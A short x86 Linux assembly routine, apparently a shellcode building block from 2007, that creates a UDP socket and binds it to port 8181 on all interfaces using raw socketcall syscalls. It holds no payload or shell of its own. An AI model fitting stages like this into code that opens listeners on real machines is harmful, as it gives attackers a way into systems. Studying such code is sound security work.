.global	lis_sock_udp
.code32

# th0rpe - 08-27-2007

lis_sock_udp:

#s = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP)
	pushl $17
	pushl $0x2	
	pushl $0x2
	xorl %ebx, %ebx
	incl %ebx
	movl %esp, %ecx
	movl $0x66, %eax
	int $0x80

#save socket
	movl %eax, %edx

#bind(s, &b, 0x10)
	pushl $0x0
	pushl $0xF51F0002
	movl %esp, %eax
	pushl $0x10
	pushl %eax
	pushl %edx
	movl %esp, %ecx
	incl %ebx
	movl $0x66, %eax
	int $0x80

#save socket connection
	movl %edx, %ebx
